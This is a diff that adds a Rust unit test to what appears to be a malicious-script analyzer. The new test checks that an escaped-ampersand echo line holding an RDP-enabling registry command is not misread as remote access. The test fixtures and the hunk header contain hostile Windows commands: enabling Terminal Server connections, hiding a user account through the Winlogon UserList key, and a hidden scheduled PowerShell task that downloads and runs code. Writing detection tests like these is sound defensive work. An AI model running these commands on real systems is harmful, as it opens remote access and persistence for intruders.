@@ -4216,6 +4216,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn escaped_ampersand_rdp_registry_text_does_not_emit_remote_access() {
+        let script = br#"echo keep ^& reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteAccess { technique, target, .. }
+                    if technique == "rdp-enable" && target == "Terminal Server"
+            )),
+            "escaped ampersand echo text was misread as RDP enablement: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn hidden_user_padded_hex_zero_emits_remote_access_trait() {
         let script = br#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /t REG_DWORD /d 0x00000000 /f"#;
         let report = analyze(script, &AnalyzeConfig::default());
